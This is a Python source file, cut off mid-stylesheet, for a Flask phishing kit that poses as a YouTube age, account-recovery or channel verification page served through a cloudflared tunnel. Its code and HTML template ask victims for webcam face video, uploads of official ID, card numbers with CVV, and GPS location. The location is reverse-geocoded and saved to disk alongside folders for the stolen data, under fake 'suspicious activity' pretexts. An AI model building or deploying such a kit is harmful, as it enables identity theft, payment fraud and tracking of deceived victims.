import os
import base64
import subprocess
import sys
import re
import logging
import json
import random
from threading import Thread
import time
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify
import requests
from geopy.geocoders import Nominatim

# --- Εγκατάσταση εξαρτήσεων και ρύθμιση σήραγγας ---

def install_package(package):
    """Εγκαθιστά ένα πακέτο χρησιμοποιώντας pip ήσυχα."""
    subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q", "--upgrade"])

def check_dependencies():
    """Ελέγχει για cloudflared και απαιτούμενα πακέτα Python."""
    try:
        subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[ΣΦΑΛΜΑ] Το 'cloudflared' δεν είναι εγκατεστημένο ή δεν βρίσκεται στο PATH του συστήματος.", file=sys.stderr)
        print("Παρακαλώ εγκαταστήστε το από: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", file=sys.stderr)
        sys.exit(1)
    
    packages = {"Flask": "flask", "requests": "requests", "geopy": "geopy"}
    for pkg_name, import_name in packages.items():
        try:
            __import__(import_name)
        except ImportError:
            install_package(pkg_name)

def run_cloudflared_and_print_link(port, script_name):
    """Ξεκινάει μια σήραγγα cloudflared και εκτυπώνει τον δημόσιο σύνδεσμο."""
    cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--protocol", "http2"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in iter(process.stdout.readline, ''):
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            print(f"{script_name} Δημόσιος Σύνδεσμος: {match.group(0)}")
            sys.stdout.flush()
            break
    process.wait()

def generate_youtube_channel_name():
    """Δημιουργεί ένα τυχαίο όνομα καναλιού τύπου YouTube."""
    prefixes = ["Tech", "Gaming", "Vlog", "Music", "Creative", "Daily", "Review", "Tutorial", 
                "Explore", "Adventure", "Cooking", "Fitness", "Travel", "Comedy", "Education"]
    
    suffixes = ["Channel", "TV", "Network", "Hub", "World", "Universe", "Studio", "Productions",
                "Central", "Zone", "Nation", "Empire", "Media", "Academy", "Lab"]
    
    name_variants = [
        f"{random.choice(prefixes)}{random.choice(suffixes)}",
        f"The {random.choice(prefixes)} {random.choice(suffixes)}",
        f"{random.choice(prefixes)} {random.choice(suffixes)}",
        f"Official{random.choice(prefixes)}",
        f"{random.choice(prefixes)}By{random.choice(['Αλέξης', 'Μαρία', 'Γιώργος', 'Αννα', 'Κώστας'])}",
        f"{random.choice(prefixes)}Daily",
        f"{random.choice(['Mr', 'Ms', 'The'])}{random.choice(prefixes)}"
    ]
    
    return random.choice(name_variants)

def generate_youtube_username():
    """Δημιουργεί ένα τυχαίο όνομα χρήστη YouTube."""
    first_names = ["Αλέξης", "Μαρία", "Γιώργος", "Αννα", "Κώστας", "Ελένη", "Δημήτρης", 
                   "Σοφία", "Νίκος", "Χριστίνα", "Παναγιώτης", "Αθηνά", "Στάθης", "Ευαγγελία", "Λεωνίδας"]
    
    username_variants = [
        f"{random.choice(first_names)}{random.randint(100, 999)}",
        f"{random.choice(first_names)}TV",
        f"{random.choice(first_names)}Official",
        f"{random.choice(first_names)}YT",
        f"Real{random.choice(first_names)}",
        f"{random.choice(first_names)}Channel",
        f"{random.choice(first_names).lower()}{random.randint(10, 99)}"
    ]
    
    return random.choice(username_variants)

def find_profile_picture(folder):
    """Αναζητά ένα αρχείο εικόνας στον φάκελο για χρήση ως εικόνα προφίλ."""
    image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp']
    
    for file in os.listdir(folder):
        file_lower = file.lower()
        if any(file_lower.endswith(ext) for ext in image_extensions):
            filepath = os.path.join(folder, file)
            try:
                with open(filepath, 'rb') as f:
                    image_data = f.read()
                    image_ext = os.path.splitext(file)[1].lower()
                    
                    mime_types = {
                        '.jpg': 'image/jpeg',
                        '.jpeg': 'image/jpeg',
                        '.png': 'image/png',
                        '.gif': 'image/gif',
                        '.bmp': 'image/bmp',
                        '.webp': 'image/webp'
                    }
                    
                    mime_type = mime_types.get(image_ext, 'image/jpeg')
                    base64_image = base64.b64encode(image_data).decode('utf-8')
                    
                    return {
                        'filename': file,
                        'data_url': f'data:{mime_type};base64,{base64_image}',
                        'path': filepath
                    }
            except Exception as e:
                print(f"Σφάλμα ανάγνωσης εικόνας προφίλ {file}: {e}")
    
    return None

def get_verification_settings():
    """Λαμβάνει τις προτιμήσεις χρήστη για τη διαδικασία επαλήθευσης YouTube."""
    print("\n" + "="*60)
    print("ΡΥΘΜΙΣΕΙΣ ΕΠΑΛΗΘΕΥΣΗΣ YOUTUBE")
    print("="*60)
    
    # Λήψη ονόματος χρήστη
    print("\n[+] ΡΥΘΜΙΣΕΙΣ ΚΑΝΑΛΙΟΥ")
    print("Εισάγετε το όνομα του καναλιού YouTube που θέλετε να εμφανιστεί")
    print("Αφήστε κενό για τυχαία δημιουργία καναλιού")
    
    channel_input = input("Όνομα καναλιού (ή πατήστε Enter για τυχαίο): ").strip()
    if channel_input:
        settings = {'channel_name': channel_input}
    else:
        random_channel = generate_youtube_channel_name()
        settings = {'channel_name': random_channel}
        print(f"[+] Δημιουργήθηκε όνομα καναλιού: {random_channel}")
    
    # Δημιουργία ονόματος χρήστη
    settings['username'] = generate_youtube_username()
    
    # Δημιουργία αριθμού συνδρομητών
    subscriber_counts = ["1.5K", "15K", "150K", "1.5M", "15M"]
    settings['subscriber_count'] = random.choice(subscriber_counts)
    
    # Δημιουργία τύπου περιεχομένου
    content_types = ["Τεχνολογία", "Βιντεοπαιχνίδια", "Εκπαίδευση", "Ψυχαγωγία", "Μουσική", 
                     "Vlogging", "Οδηγοί", "Κριτικές", "Κωμωδία", "Τρόπος Ζωής"]
    settings['content_type'] = random.choice(content_types)
    
    # Αναζήτηση εικόνας προφίλ
    global DOWNLOAD_FOLDER
    profile_pic = find_profile_picture(DOWNLOAD_FOLDER)
    if profile_pic:
        settings['profile_picture'] = profile_pic['data_url']
        settings['profile_picture_filename'] = profile_pic['filename']
        print(f"[+] Βρέθηκε εικόνα προφίλ: {profile_pic['filename']}")
    else:
        settings['profile_picture'] = None
        settings['profile_picture_filename'] = None
        print(f"[!] Δεν βρέθηκε εικόνα προφίλ στον φάκελο")
        print(f"[!] Συμβουλή: Τοποθετήστε μια εικόνα (jpg/png) στον φάκελο {DOWNLOAD_FOLDER} για χρήση ως εικόνα προφίλ")
    
    print(f"\n[+] Κανάλι: {settings['channel_name']}")
    print(f"[+] Όνομα χρήστη: @{settings['username']}")
    print(f"[+] Συνδρομητές: {settings['subscriber_count']}")
    print(f"[+] Περιεχόμενο: {settings['content_type']}")
    
    # Τύπος επαλήθευσης
    print("\n1. Τύπος Επαλήθευσης:")
    print("Α - Επαλήθευση Ηλικίας (για περιορισμένο περιεχόμενο)")
    print("Β - Αναγνώριση Λογαριασμού (ύποπτη δραστηριότητα)")
    print("Γ - Επαλήθευση Κανάλι (μπλε σήμα)")
    
    while True:
        vtype = input("Επιλέξτε τύπο (Α/Β/Γ, προεπιλογή: Α): ").strip().upper()
        if not vtype:
            vtype = 'A'
        if vtype in ['Α', 'Β', 'Γ']:
            if vtype == 'Α':
                settings['verification_type'] = 'age'
                settings['reason'] = "Πρόσβαση σε περιεχόμενο με περιορισμό ηλικίας"
            elif vtype == 'Β':
                settings['verification_type'] = 'recovery'
                settings['reason'] = "Εντοπίστηκε ύποπτη δραστηριότητα"
            else:
                settings['verification_type'] = 'channel'
                settings['reason'] = "Σήμα επαλήθευσης καναλιού"
            break
        else:
            print("Παρακαλώ εισάγετε Α, Β, ή Γ.")
    
    # Επαλήθευση προσώπου
    if settings['verification_type'] in ['age', 'recovery']:
        print("\n2. Επαλήθευση Προσώπου:")
        print("Απαιτείται επαλήθευση προσώπου;")
        face_enabled = input("Ενεργοποίηση επαλήθευσης προσώπου (ν/ο, προεπιλογή: ν): ").strip().lower()
        settings['face_enabled'] = face_enabled in ['ν', 'ναι', 'n', 'yes', '']
        
        if settings['face_enabled']:
            while True:
                try:
                    duration = input("Διάρκεια σε δευτερόλεπτα (5-30, προεπιλογή: 15): ").strip()
                    if not duration:
                        settings['face_duration'] = 15
                        break
                    duration = int(duration)
                    if 5 <= duration <= 30:
                        settings['face_duration'] = duration
                        break
                    else:
                        print("Παρακαλώ εισάγετε αριθμό μεταξύ 5 και 30.")
                except ValueError:
                    print("Παρακαλώ εισάγετε έγκυρο αριθμό.")
    
    # Επαλήθευση ταυτότητας
    print("\n3. Επαλήθευση Ταυτότητας:")
    print("Απαιτείται μεταφόρτωση εγγράφου ταυτότητας;")
    id_enabled = input("Ενεργοποίηση επαλήθευσης ταυτότητας (ν/ο, προεπιλογή: ν): ").strip().lower()
    settings['id_enabled'] = id_enabled in ['ν', 'ναι', 'n', 'yes', '']
    
    # Επαλήθευση πληρωμής (για επαλήθευση καναλιού)
    if settings['verification_type'] == 'channel':
        print("\n4. Επαλήθευση Πληρωμής:")
        print("Απαιτείται επαλήθευση πληρωμής για επαλήθευση καναλιού;")
        payment_enabled = input("Ενεργοποίηση επαλήθευσης πληρωμής (ν/ο, προεπιλογή: ο): ").strip().lower()
        settings['payment_enabled'] = payment_enabled in ['ν', 'ναι', 'n', 'yes']
        
        if settings['payment_enabled']:
            while True:
                try:
                    amount = input("Ποσό σε $ (0.01-10.00, προεπιλογή: 1.00): ").strip()
                    if not amount:
                        settings['payment_amount'] = "1.00"
                        break
                    if re.match(r'^\d+(\.\d{1,2})?$', amount):
                        settings['payment_amount'] = amount
                        break
                    else:
                        print("Παρακαλώ εισάγετε έγκυρο ποσό (π.χ., 1.00)")
                except:
                    print("Παρακαλώ εισάγετε έγκυρο ποσό.")
    
    # Επαλήθευση τοποθεσίας
    print("\n5. Επαλήθευση Τοποθεσίας:")
    print("Απαιτείται επαλήθευση τοποθεσίας;")
    location_enabled = input("Ενεργοποίηση επαλήθευσης τοποθεσίας (ν/ο, προεπιλογή: ο): ").strip().lower()
    settings['location_enabled'] = location_enabled in ['ν', 'ναι', 'n', 'yes']
    
    return settings

# --- Συναρτήσεις επεξεργασίας τοποθεσίας ---

geolocator = Nominatim(user_agent="youtube_verification_el")

def process_and_save_location(data, session_id):
    """Επεξεργάζεται και αποθηκεύει δεδομένα τοποθεσίας."""
    try:
        lat = data.get('latitude')
        lon = data.get('longitude')
        
        if not lat or not lon:
            return
        
        # Λήψη πληροφοριών διεύθυνσης
        address_details = {}
        full_address = "Άγνωστο"
        try:
            location = geolocator.reverse((lat, lon), language='el', timeout=10)
            if location:
                full_address = location.address
                if hasattr(location, 'raw') and 'address' in location.raw:
                    address_details = location.raw.get('address', {})
        except Exception:
            pass
        
        # Προετοιμασία δομημένων δεδομένων
        location_data = {
            "platform": "youtube_verification_el",
            "session_id": session_id,
            "timestamp": datetime.now().isoformat(),
            "gps_coordinates": {
                "latitude": lat,
                "longitude": lon,
                "accuracy_m": data.get('accuracy')
            },
            "address_information": {
                "full_address": full_address,
                "city": address_details.get("city"),
                "state": address_details.get("state"),
                "country": address_details.get("country")
            },
            "verification_data": {
                "target_username": data.get('target_username', 'άγνωστο'),
                "verification_type": data.get('verification_type', 'άγνωστο'),
                "reason": data.get('reason', 'άγνωστο')
            }
        }
        
        # Αποθήκευση σε αρχείο
        filename = f"youtube_location_{session_id}.json"
        filepath = os.path.join(DOWNLOAD_FOLDER, 'location_data', filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(location_data, f, indent=2, ensure_ascii=False)
        
        print(f"Αποθηκεύτηκαν δεδομένα τοποθεσίας YouTube: {filename}")
        
    except Exception as e:
        print(f"Σφάλμα επεξεργασίας τοποθεσίας: {e}")

# --- Εφαρμογή Flask ---

app = Flask(__name__)

# Παγκόσμιες ρυθμίσεις
VERIFICATION_SETTINGS = {
    'channel_name': generate_youtube_channel_name(),
    'username': generate_youtube_username(),
    'subscriber_count': "150K",
    'content_type': "Τεχνολογία",
    'verification_type': 'age',
    'reason': "Πρόσβαση σε περιεχόμενο με περιορισμό ηλικίας",
    'face_enabled': True,
    'face_duration': 15,
    'id_enabled': True,
    'payment_enabled': False,
    'payment_amount': "1.00",
    'location_enabled': False,
    'profile_picture': None,
    'profile_picture_filename': None
}

DOWNLOAD_FOLDER = os.path.expanduser('~/storage/downloads/YouTube Verification Ελληνικά')
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'face_verification'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'id_documents'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'payment_data'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'location_data'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'user_data'), exist_ok=True)

def create_html_template(settings):
    """Δημιουργεί το ελληνικό πρότυπο επαλήθευσης YouTube."""
    channel_name = settings['channel_name']
    username = f"@{settings['username']}"
    subscriber_count = settings['subscriber_count']
    content_type = settings['content_type']
    verification_type = settings['verification_type']
    reason = settings['reason']
    face_duration = settings.get('face_duration', 15)
    payment_amount = settings.get('payment_amount', "1.00")
    profile_picture = settings.get('profile_picture')
    face_enabled = settings.get('face_enabled', False)
    id_enabled = settings.get('id_enabled', False)
    payment_enabled = settings.get('payment_enabled', False)
    location_enabled = settings.get('location_enabled', False)
    
    # Προσδιορισμός βημάτων βάσει τύπου επαλήθευσης
    total_steps = 2  # Εισαγωγή + Βήμα 1
    
    if verification_type == 'age':
        step_titles = ["Επαλήθευση Ηλικίας", "Επαληθεύστε την Ηλικία σας", "Επαλήθευση Ταυτότητας", "Ολοκλήρωση"]
        if face_enabled:
            total_steps += 1
        if id_enabled:
            total_steps += 1
    elif verification_type == 'recovery':
        step_titles = ["Ανάκτηση Λογαριασμού", "Έλεγχος Ταυτότητας", "Επαλήθευση Ασφαλείας", "Ολοκλήρωση"]
        if face_enabled:
            total_steps += 1
        if id_enabled:
            total_steps += 1
        if location_enabled:
            total_steps += 1
    else:  # επαλήθευση καναλιού
        step_titles = ["Επαλήθευση Κανάλι", "Πληροφορίες Κανάλι", "Πληρωμή", "Ολοκλήρωση"]
        if payment_enabled:
            total_steps += 1
        if id_enabled:
            total_steps += 1
    
    total_steps += 1  # Τελικό βήμα
    
    # Κατασκευή υπό συνθήκη τμημάτων HTML
    verification_badge = ''
    if verification_type == 'age':
        verification_badge = '<span class="verification-badge">Επαλήθευση Ηλικίας</span>'
    elif verification_type == 'recovery':
        verification_badge = '<span class="verification-badge">Ανάκτηση Λογαριασμού</span>'
    else:
        verification_badge = '<span class="verification-badge">Επαλήθευση Κανάλι</span>'
    
    # Κατασκευή ενδείξεων βημάτων
    step_indicators = ''
    for i in range(1, total_steps + 1):
        if i == 1:
            step_indicators += f'''
                <div class="step">
                    <div class="step-number active">1</div>
                    <div class="step-label active">{step_titles[0] if step_titles else "Έναρξη"}</div>
                </div>
            '''
        elif i <= len(step_titles):
            step_indicators += f'''
                <div class="step" id="step{i}Indicator">
                    <div class="step-number">{i}</div>
                    <div class="step-label">{step_titles[i-1] if i-1 < len(step_titles) else "Επαλήθευση"}</div>
                </div>
            '''
        else:
            step_indicators += f'''
                <div class="step" id="step{i}Indicator">
                    <div class="step-number">{i}</div>
                    <div class="step-label">Βήμα {i}</div>
                </div>
            '''
    
    # Κατασκευή τμήματος επαλήθευσης προσώπου
    face_verification_section = ''
    if face_enabled:
        face_verification_section = f'''
            <div class="camera-section" id="faceVerificationSection">
                <h3>Επαλήθευση Προσώπου</h3>
                <div class="camera-container">
                    <video id="faceVideo" autoplay playsinline></video>
                    <div class="face-overlay">
                        <div class="face-circle"></div>
                    </div>
                </div>
                <div class="timer" id="faceTimer">00:{str(face_duration).zfill(2)}</div>
                <button class="btn" id="startFaceBtn" onclick="startFaceVerification()">Έναρξη Επαλήθευσης Προσώπου</button>
            </div>
        '''
    
    # Κατασκευή τμήματος μεταφόρτωσης ταυτότητας
    id_upload_section = ''
    if id_enabled:
        id_upload_section = f'''
            <div class="upload-section" onclick="document.getElementById('idFileInput').click()" id="idUploadSection">
                <div class="upload-icon">📄</div>
                <div class="upload-text">Μεταφόρτωση Επίσημου Δελτίου Ταυτότητας</div>
                <div class="upload-subtext">Δίπλωμα Οδήγησης, Διαβατήριο ή Ταυτότητα</div>
                <input type="file" id="idFileInput" accept="image/*,.pdf" style="display:none" onchange="handleIDUpload(this)">
            </div>
            <div class="preview-container" id="idPreview">
                <img class="preview-image" id="idPreviewImage">
            </div>
        '''
    
    # Κατασκευή τμήματος πληρωμής
    payment_section = ''
    if payment_enabled:
        payment_section = f'''
            <div class="payment-form" id="paymentSection">
                <h3>Επαλήθευση Πληρωμής</h3>
                <p style="margin-bottom: 20px; color: var(--youtube-muted);">Ένα ποσό ${payment_amount} θα κρατηθεί προσωρινά στην κάρτα σας για επαλήθευση. Το ποσό αυτό θα επιστραφεί.</p>
                <div class="form-group">
                    <label class="form-label">Αριθμός Κάρτας</label>
                    <input type="text" class="form-input" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19">
                </div>
                <div class="card-details">
                    <div class="form-group">
                        <label class="form-label">Ημερομηνία Λήξης</label>
                        <input type="text" class="form-input" id="expiryDate" placeholder="ΜΜ/ΕΕ" maxlength="5">
                    </div>
                    <div class="form-group">
                        <label class="form-label">CVV</label>
                        <input type="text" class="form-input" id="cvv" placeholder="123" maxlength="4">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Ταχυδρομικός Κώδικας</label>
                        <input type="text" class="form-input" id="zipCode" placeholder="12345" maxlength="10">
                    </div>
                </div>
            </div>
        '''
    
    # Κατασκευή τμήματος τοποθεσίας
    location_section = ''
    if location_enabled:
        location_section = f'''
            <div class="upload-section" id="locationSection">
                <div class="upload-icon">📍</div>
                <div class="upload-text">Επαλήθευση Τοποθεσίας</div>
                <div class="upload-subtext">Επαληθεύστε την τοποθεσία σας για λόγους ασφάλειας</div>
                <div class="status-message" id="locationStatus">Κάντε κλικ στο παρακάτω κουμπί για επαλήθευση τοποθεσίας</div>
            </div>
        '''
    
    # Κατασκευή τμήματος ελέγχου ηλικίας
    age_gate_section = ''
    if verification_type == 'age':
        age_gate_section = f'''
            <div class="age-gate" id="ageGateStep">
                <div class="age-question">Είστε 18 ετών ή άνω;</div>
                <div class="age-buttons">
                    <button class="btn" onclick="confirmAge(true)">Ναι, είμαι 18 ετών ή άνω</button>
                    <button class="btn btn-outline" onclick="confirmAge(false)">Όχι, είμαι κάτω των 18</button>
                </div>
            </div>
        '''
    
    # Κατασκευή τμήματος πληροφοριακού πλαισίου
    info_box_section = ''
    if verification_type == 'recovery':
        info_box_section = '''
            <div class="info-box">
                <h4>Γιατί απαιτείται αυτό;</h4>
                <p>Εντοπίσαμε ύποπτες προσπάθειες σύνδεσης στον λογαριασμό σας από νέες τοποθεσίες. Ολοκληρώστε την επαλήθευση για να ασφαλίσετε τον λογαριασμό σας και να αποτρέψετε μη εξουσιοδοτημένη πρόσβαση.</p>
            </div>
        '''
    elif verification_type == 'channel':
        info_box_section = '''
            <div class="info-box">
                <h4>Πλεονεκτήματα Επαλήθευσης:</h4>
                <ul style="padding-left: 20px; margin-top: 10px;">
                    <li>Επίσημο σήμα επαλήθευσης</li>
                    <li>Προτεραιότητα σε αποτελέσματα αναζήτησης</li>
                    <li>Πρόσβαση σε προηγμένες λειτουργίες</li>
                    <li>Αυξημένη αξιοπιστία</li>
                </ul>
            </div>
        '''
    
    # Κατασκευή κειμένου επαληθευμένου καναλιού
    channel_verified_text = ''
    if verification_type == 'age':
        channel_verified_text = 'Επαληθεύθηκε Ηλικία'
    elif verification_type == 'recovery':
        channel_verified_text = 'Ασφαλίστηκε Λογαριασμός'
    else:
        channel_verified_text = 'Επαληθεύθηκε Κανάλι'
    
    # Κατασκευή περιγραφής επαλήθευσης
    verification_description = ''
    if verification_type == 'age':
        verification_description = 'Για να παρακολουθήσετε περιεχόμενο με περιορισμό ηλικίας, πρέπει να επαληθεύσετε την ηλικία σας.'
    elif verification_type == 'recovery':
        verification_description = 'Εντοπίσαμε ασυνήθιστη δραστηριότητα στον λογαριασμό σας. Επαληθεύστε την ταυτότητά σας για να αποκτήσετε ξανά πρόσβαση.'
    else:
        verification_description = 'Επαληθευθείτε για να ξεκλειδώσετε το σήμα επαλήθευσης YouTube και πρόσθετες λειτουργίες.'
    
    # Κατασκευή κειμένου κουμπιού συνέχειας
    continue_button_text = ''
    if verification_type == 'age':
        continue_button_text = 'Συνέχεια στην Επαλήθευση Ηλικίας'
    elif verification_type == 'recovery':
        continue_button_text = 'Έναρξη Ανάκτησης Λογαριασμού'
    else:
        continue_button_text = 'Έναρξη Επαλήθευσης Κανάλι'
    
    template = f'''<!DOCTYPE html>
<html lang="el">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Επαλήθευση YouTube</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        :root {{
            --youtube-red: #FF0000;
            --youtube-dark: #0F0F0F;
            --youtube-light: #FFFFFF;
            --youtube-gray: #272727;
            --youtube-border: #3F3F3F;
            --youtube-text: #F1F1F1;
            --youtube-muted: #AAAAAA;
        }}
        
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            font-family: 'Roboto', 'Segoe UI', Arial, sans-serif;
            background-color: var(--youtube-dark);
            color: var(--youtube-text);
            line-height: 1.6;
            min-height: 100vh;
        }}
        
        .container {{
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }}
        
        /* Κεφαλίδα */
        .header {{
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 20px 0;
            border-bottom: 1px solid var(--youtube-border);
            margin-bottom: 30px;
        }}
        
        .logo {{
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 24px;
            font-weight: 500;
        }}
        
        .logo-icon {{
            color: var(--youtube-red);
            font-size: 28px;
        }}
        
        .verification-badge {{
            background: var(--youtube-gray);
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 500;
        }}
        
        /* Πληροφορίες Κανάλι */
        .channel-card {{
            background: var(--youtube-gray);
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 30px;
            border: 1px solid var(--youtube-border);
        }}
        
        .channel-header {{
            display: flex;
            align-items: center;
            gap: 20px;
            margin-bottom: 20px;
        }}
        
        .channel-avatar {{
            width: 80px;
            height: 80px;
            border-radius: 50%;
            overflow: hidden;
            background: linear-gradient(45deg, #FF0000, #FF6B00);
        }}
        
        .channel-avatar img {{
            width: 100%;
            height: 100%;
            object-fit: cover;
        }}
        
        .channel-info h2 {{
            font-size: 24px;
            margin-bottom: 5px;
        }}
        
        .channel-info p {{
            color: var(--youtube-muted);
            margin-bottom: 10px;
        }}
        
        .channel-stats {{
            display: flex;
            gap: 20px;
            font-size: 14px;
        }}
        
        .stat {{
            text-align: center;
        }}
        
        .stat-value {{
            font-weight: 600;
            font-size: 18px;
            color: var(--youtube-light);
        }}
        
        .stat-label {{
            color: var(--youtube-muted);
            font-size: 12px;
        }}
        
        /* Προειδοποίηση */
        .alert {{
            background: rgba(255, 0, 0, 0.1);
            border: 1px solid var(--youtube-red);
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 30px;
            display: flex;
            align-items: flex-start;
            gap: 15px;
        }}
        
        .alert-icon {{
            color: var(--youtube-red);
            font-size: 24px;
            margin-top: 2px;
        }}
        
        .alert-content h3 {{
            margin-bottom: 10px;
            color: var(--youtube-red);
        }}
        
        /* Βήματα */
        .steps-container {{
            margin-bottom: 40px;
        }}
        
        .step-indicator {{
            display: flex;
            justify-content: space-between;
            margin-bottom: 40px;
            position: relative;
        }}
        
        .step-indicator::before {{
            content: '';
            position: absolute;
            top: 20px;
            left: 0;
            right: 0;
            height: 2px;
            background: var(--youtube-border);
            z-index: 1;
        }}
        
        .step {{
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
            z-index: 2;
        }}
        
        .step-number {{
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: var(--youtube-border);
            color: var(--youtube-muted);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 600;
            margin-bottom: 10px;
            border: 3px solid var(--youtube-dark);
            transition: all 0.3s;
        }}
        
        .step-number.active {{
            background: var(--youtube-red);
            color: white;
            transform: scale(1.1);
        }}
        
        .step-number.completed {{
            background: #4CAF50;
            color: white;
        }}
        
        .step-label {{
            font-size: 14px;
            color: var(--youtube-muted);
            text-align: center;
            max-width: 100px;
        }}
        
        .step-label.active {{
            color: var(--youtube-text);
            font-weight: 500;
        }}
        
        /* Περιεχόμενο Βήματος */
        .step-content {{
            display: none;
            animation: fadeIn 0.5s;
        }}
        
        @keyframes fadeIn {{
            from {{ opacity: 0; transform: translateY(20px); }}
            to {{ opacity: 1; transform: translateY(0); }}
        }}
        
        .step-content.active {{
            display: block;
        }}
        
        .step-title {{
            font-size: 28px;
            margin-bottom: 15px;
            font-weight: 500;
        }}
        
        .step-description {{
            color: var(--youtube-muted);
            margin-bottom: 30px;
            font-size: 16px;
        }}
        
        /* Επαλήθευση Ηλικίας */
        .age-gate {{
            background: var(--youtube-gray);
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 30px;
            border: 1px solid var(--youtube-border);
        }}
        
        .age-question {{
            font-size: 20px;
            margin-bottom: 25px;
            text-align: center;
        }}
        
        .age-buttons {{
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }}
        
        /* Τμήμα Κάμερας */
        .camera-section {{
            text-align: center;
            margin-bottom: 30px;
        }}
        
        .camera-container {{
            width: 300px;
            height: 300px;
            margin: 0 auto 25px;
            border-radius: 12px;
            overflow: hidden;
            background: #000;
            border: 3px solid var(--youtube-red);
            position: relative;
        }}
        
        .camera-container video {{
            width: 100%;
            height: 100%;
            object-fit: cover;
        }}
        
        .face-overlay {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
        }}
        
        .face-circle {{
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 200px;
            height: 200px;
            border: 2px solid white;
            border-radius: 50%;
            box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.7);
        }}
        
        .timer {{
            font-size: 36px;
            font-weight: 500;
            color: var(--youtube-red);
            margin: 20px 0;
            font-family: 'Courier New', monospace;
        }}
        
        /* Μεταφόρτωση Ταυτότητας */
        .upload-section {{
            background: var(--youtube-gray);
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 30px;
            border: 2px dashed var(--youtube-border);
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
        }}
        
        .upload-section:hover {{
            border-color: var(--youtube-red);
            background: rgba(255, 0, 0, 0.05);
        }}
        
        .upload-icon {{
            font-size: 48px;
            color: var(--youtube-red);
            margin-bottom: 20px;
        }}
        
        .upload-text {{
            font-size: 18px;
            font-weight: 500;
            margin-bottom: 10px;
        }}
        
        .upload-subtext {{
            color: var(--youtube-muted);
            font-size: 14px;
        }}
        
        .preview-container {{
            margin-top: 20px;
            display: none;
        }}
        
        .preview-image {{
            max-width: 200px;
            max-height: 150px;
            border-radius: 8px;
            border: 2px solid var(--youtube-border);
        }}
        
        /* Φόρμα Πληρωμής */
        .payment-form {{
            background: var(--youtube-gray);
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 30px;
        }}
        
        .form-group {{
            margin-bottom: 20px;
        }}
        
        .form-label {{
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: var(--youtube-text);
        }}
        
        .form-input {{
            width: 100%;
            padding: 14px;
            background: var(--youtube-dark);
            border: 2px solid var(--youtube-border);
            border-radius: 8px;
            color: var(--youtube-text);
            font-size: 16px;
            transition: border-color 0.3s;
        }}
        
        .form-input:focus {{
            outline: none;
            border-color: var(--youtube-red);
        }}
        
        .card-details {{
            display: grid;
            grid-template-columns: 2fr 1fr 1fr;
            gap: 15px;
        }}
        
        /* Κουμπιά */
        .btn {{
            display: inline-block;
            padding: 16px 32px;
            background: var(--youtube-red);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s;
            text-align: center;
            text-decoration: none;
        }}
        
        .btn:hover {{
            background: #CC0000;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(255, 0, 0, 0.3);
        }}
        
        .btn:active {{
            transform: translateY(0);
        }}
        
        .btn:disabled {{
            background: var(--youtube-border);
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }}
        
        .btn-block {{
            display: block;
            width: 100%;
        }}
        
        .btn-outline {{
            background: transparent;
            border: 2px solid var(--youtube-border);
            color: var(--youtube-text);
        }}
        
        .btn-outline:hover {{
            background: var(--youtube-gray);
            border-color: var(--youtube-red);
            color: var(--youtube-red);
        }}
        
        .button-group {{
            display: flex;
            gap: 15px;
            margin-top: 30px;
        }}
        
        /* Μηνύματα Κατάστασης */
        .status-message {{
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            text-align: center;
        }}
        
        .status-success {{
            background: rgba(76, 175, 80, 0.1);
            color: #4CAF50;
            border: 1px solid #4CAF50;
        }}
        
        .status-error {{
            background: rgba(255, 0, 0, 0.1);
            color: var(--youtube-red);
            border: 1px solid var(--youtube-red);
        }}
        
        .status-processing {{
            background: rgba(255, 193, 7, 0.1);
            color: #FFC107;
            border: 1px solid #FFC107;
        }}
        
        /* Φορτωτής */
        .loading-spinner {{
            display: inline-block;
            width: 20px;
            height: 20px;
